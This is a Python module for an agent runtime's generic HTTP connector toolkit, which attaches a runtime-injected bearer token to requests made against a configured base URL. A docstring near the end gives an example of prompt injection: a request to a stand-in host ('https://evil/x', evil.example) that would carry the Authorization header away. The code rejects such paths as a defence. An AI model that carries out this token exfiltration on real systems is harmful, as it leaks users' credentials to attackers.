"""Generic HTTP `api_connector` toolkit (§1.7). `config.base_url` is the
target; the content-addressed idempotency key is forwarded as
`Idempotency-Key` so a remote that honors it dedupes the side effect too.

Per §8(c) the connector does NOT resolve secrets itself — it "receives
resolved short-lived credentials the runtime injects" at dispatch time. The
registry (the runtime layer) passes a `get_auth_token` provider that resolves
lazily on first use: the handler calls it at dispatch and gets a bearer token
string, never seeing the `auth_ref` pointer or the SecretResolver. Lazy
(vs. resolved-at-build) means a run whose path never touches this toolkit
doesn't require its secret to be present.

The httpx client is injectable so tests exercise request shaping and auth
injection without a network round-trip.
"""

from __future__ import annotations

import json
from typing import Any, Callable

from ravana.runtime.toolkits.base import ToolkitError

# §8(a): the connector's declared input schema. Result is a plain string
# (the response body), so there is no separate output schema to declare.
INPUT_SCHEMA: dict[str, Any] = {
    "type": "object",
    "properties": {
        "method": {"type": "string", "enum": ["GET", "POST", "PUT", "PATCH", "DELETE"]},
        "path": {"type": "string"},
        "json": {"type": "object"},
        "params": {"type": "object"},
    },
    "required": ["path"],
    "additionalProperties": False,
}


_READ_ONLY_METHODS = frozenset({"GET", "HEAD", "OPTIONS"})
_ALLOWED_METHODS = frozenset({"GET", "HEAD", "OPTIONS", "POST", "PUT", "PATCH", "DELETE"})


class ApiConnectorHandler:
    input_schema = INPUT_SCHEMA
    executable = True

    def __init__(
        self,
        config: dict[str, Any],
        get_auth_token: Callable[[], str | None] = lambda: None,
        client: Any | None = None,
    ):
        self._base_url = config.get("base_url")
        if not self._base_url:
            raise ToolkitError("api_connector requires config.base_url")
        self.description = (
            f"Make an HTTP request to the API at {self._base_url}. Set 'method' and a "
            "base_url-relative 'path' (must start with '/'; absolute URLs are rejected). "
            "Optional 'json' body and 'params' query."
        )
        # A provider the runtime injects (§8c): returns an already-resolved
        # token at dispatch. The connector never holds the auth_ref or resolver.
        self._get_auth_token = get_auth_token
        self._client = client  # injected in tests; real client built lazily

    def is_side_effecting(self, arguments: dict[str, Any]) -> bool:
        return _method_of(arguments) not in _READ_ONLY_METHODS

    def _resolve_client(self) -> Any:
        if self._client is None:
            import httpx

            self._client = httpx.AsyncClient(base_url=self._base_url)
        return self._client

    async def call(self, *, arguments: dict[str, Any], idempotency_key: str) -> str:
        # Validate BEFORE resolving the token or building headers, so a
        # rejected request never has the bearer credential attached to it.
        method = _method_of(arguments)
        if method not in _ALLOWED_METHODS:
            raise ToolkitError(f"api_connector: method '{method}' not allowed (one of {sorted(_ALLOWED_METHODS)})")
        path = arguments.get("path")
        if not path:
            raise ToolkitError("api_connector: 'path' is required")
        _reject_offbase_path(path)  # §8-security: never let a model-supplied path escape base_url with the token

        headers: dict[str, str] = {"Idempotency-Key": idempotency_key}
        token = self._get_auth_token()
        if token:
            headers["Authorization"] = f"Bearer {token}"

        client = self._resolve_client()
        try:
            response = await client.request(
                method, path, headers=headers, json=arguments.get("json"), params=arguments.get("params")
            )
        except Exception as exc:  # noqa: BLE001 - normalize transport failures
            raise ToolkitError(f"api_connector request to {path} failed: {exc}") from exc

        status = getattr(response, "status_code", None)
        body = _body_text(response)
        if status is not None and status >= 400:
            raise ToolkitError(f"api_connector got HTTP {status} from {path}: {body[:500]}")
        return body


def _method_of(arguments: dict[str, Any]) -> str:
    return str(arguments.get("method", "POST")).upper()


def _reject_offbase_path(path: str) -> None:
    """A model-controlled absolute or scheme-relative URL bypasses httpx's
    base_url entirely — `client.request('POST', 'https://evil/x')` goes to
    evil.example carrying the Authorization header (token exfiltration via
    prompt injection). Require a base-relative path: no scheme, no host, and a
    leading '/'."""
    from urllib.parse import urlsplit

    parts = urlsplit(path)
    if parts.scheme or parts.netloc:
        raise ToolkitError(
            f"api_connector: path must be base_url-relative, not an absolute/scheme-relative URL ({path!r}) — "
            "refusing to send the credential off-base"
        )
    if not path.startswith("/"):
        raise ToolkitError(f"api_connector: path must start with '/' ({path!r})")


def _body_text(response: Any) -> str:
    try:
        return json.dumps(response.json())
    except Exception:  # noqa: BLE001
        return getattr(response, "text", "")
